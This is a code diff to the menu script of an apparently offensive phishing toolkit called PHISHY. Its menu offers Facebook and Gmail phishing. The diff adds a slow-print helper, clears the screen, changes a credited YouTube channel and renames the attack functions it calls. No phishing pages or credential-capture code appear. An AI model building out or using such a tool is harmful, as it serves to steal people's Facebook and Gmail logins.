@@ -4,9 +4,15 @@ from core.starkcore import *
 from time import sleep as timeout
 from termcolor import colored
 
-def menu():
+def printslow(str):
+    for letter in str:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        time.sleep(0.1)
 
-    print(colored("""
+def menu():
+ os.system("clear")
+ print(colored("""
 
  .########..##.....##.####..######..##.....##.##....##
  .##.....##.##.....##..##..##....##.##.....##..##..##.
@@ -18,7 +24,7 @@ def menu():
  
                                                       
 >>>>>>created by aniket stark    
->>>>>> Aniketstark tech (youtube channel)
+>>>>>> GamersTech330 (youtube channel)
 Thanks to Sagar Tripathirock
 =============================================
 1. Facebook phishing
@@ -37,11 +43,11 @@ while loop:
         stark = raw_input("stark > ")
 	
 	if stark == "1":
-		Facebook()
+		fbanner()
 	elif stark == "2":
-		FacebookA()
+		fbab()
 	elif stark == "3":
-		Gmail()
+		gmailb()
 	elif stark == "4":
 		Update()
 	elif stark == "5":
@@ -52,3 +58,7 @@ while loop:
                   print  (colored("ERROR: WRONG COMMAND BRO.?", 'red'))
                   timeout(1)
                   restartprogram()
+
+
+	
+
